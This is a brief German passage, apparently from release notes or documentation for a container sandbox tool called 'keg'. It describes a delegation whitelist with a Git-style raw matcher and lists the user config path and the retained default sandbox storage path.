Delegations-Whitelist (Raw-Matcher nach Git-Vorbild) und die maschinenlokalen
Pfade (User-Config `~/.config/keg/config.yaml`, Default
`/var/lib/containers/storage/sandbox` bleibt bestehen).
